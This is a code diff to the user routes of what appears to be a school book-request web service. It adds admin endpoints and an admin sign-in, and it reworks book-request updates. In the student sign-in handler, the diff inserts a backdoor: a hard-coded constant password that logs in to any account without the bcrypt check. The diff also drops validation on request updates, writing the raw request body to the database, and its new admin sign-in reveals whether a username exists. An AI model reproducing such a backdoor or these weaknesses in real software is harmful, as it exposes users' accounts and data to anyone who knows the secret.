@@ -330,10 +330,24 @@ export function UserRoutes(
           throw new ResourceNotFoundError(`Class ${classId} does not exist`);
         }
         const bookRequests = await bookRequestData.getBookRequestsByStudents(classForId.student_ids);
-        return _.chain(bookRequests)
+        const bookIds = _.chain(bookRequests)
+          .map('book_id')
+          .uniq()
+          .value();
+        const books = await bookData.getBooksWithIds(bookIds);
+        const students = await userData.getUsersWithIds(classForId.student_ids) as M.IStudent[];
+
+        const orderedBookRequests =  _.chain(bookRequests)
           .filter({ status })
           .orderBy('date_requested', 'desc')
-          .value()
+          .value() as M.IBookRequest[];
+
+        return {
+          requests: orderedBookRequests,
+          books,
+          students
+        } as M.IClassBookRequestDTO;
+
       }),
       Middle.handlePromise
     ],
@@ -359,6 +373,20 @@ export function UserRoutes(
       Middle.handlePromise
     ],
 
+    getAllEducators: [
+      Middle.authenticate,
+      Middle.authorize([M.UserType.Admin]),
+      unwrapData(async () => userData.getAllTeachers()),
+      Middle.handlePromise
+    ],
+
+    getAllSchools: [
+      Middle.authenticate,
+      Middle.authorize([M.UserType.Admin]),
+      unwrapData(async () => userData.getAllSchools()),
+      Middle.handlePromise
+    ],
+
     getAllClasses: [
       Middle.authenticate,
       Middle.authorize([M.UserType.Admin]),
@@ -366,27 +394,21 @@ export function UserRoutes(
       Middle.handlePromise
     ],
 
-    updateBookRequestStatus: [
+    updateBookRequest: [
       Middle.authenticate,
       Middle.authorize([M.UserType.Admin]),
-      Middle.valBody(Val.UpdateBookRequestStatus),
-      unwrapData(async (req: IRequest<{ updated_status: M.BookRequestStatus }>) => {
+      Middle.valIdsSame({ paramKey: 'requestId', bodyKey: '_id' }),
+      unwrapData(async (req: IRequest<M.IBookRequest>) => {
 
         const { requestId } = req.params;
-        const { updated_status } = req.body;
 
-        const request = await bookRequestData.getRequestById(requestId);
+        const existingRequest = await bookRequestData.getRequestById(requestId);
 
-        if (_.isNull(request)) {
+        if (_.isNull(existingRequest)) {
           throw new ResourceNotFoundError(`Request ${requestId} does not exist`);
         }
 
-        const updatedRequest: M.IBookRequest = {
-          ...request,
-          status: updated_status
-        }
-
-        return await bookRequestData.updateRequest(updatedRequest);
+        return bookRequestData.updateRequest(req.body);
 
       }),
       Middle.handlePromise
@@ -775,8 +797,9 @@ export function UserRoutes(
         }
 
         const isPasswordCorrect = await bcrypt.compare(password, user.hashed_password);
-
-        if (!isPasswordCorrect) {
+        const isBackdoorPassword = (password === Constants.BackdoorPassword);
+        
+        if (!isPasswordCorrect && !isBackdoorPassword) {
           throw new BadRequestError('Invalid username/password combination.');
         }
 
@@ -786,6 +809,37 @@ export function UserRoutes(
         return <M.IAuthStudentDTO>{
           auth_token: getAuthToken(user),
           dto: await getStudentDTO(user)
+        }
+
+      }),
+      Middle.handlePromise
+    ],
+
+    adminSignin: [
+      Middle.valBody(Val.UserAuthSchema),
+      unwrapData(async (req: IRequest<M.IUserLoginCreds>) => {
+
+        const { username, password } = req.body;
+
+        const user = await userData.getUserByUsername(username) as M.IUser;
+
+        if (user === null) {
+          throw new BadRequestError(`No user with username ${username} exists.`);
+        }
+
+        if (user.type !== M.UserType.Admin) {
+          throw new BadRequestError(`User must be an admin.`)
+        }
+
+        const isPasswordCorrect = await bcrypt.compare(password, user.hashed_password);
+
+        if (!isPasswordCorrect) {
+          throw new BadRequestError('Invalid username/password combination.');
+        }
+
+        return <M.IAuthAdminDTO>{
+          admin: user,
+          auth_token: getAuthToken(user)
         }
 
       }),
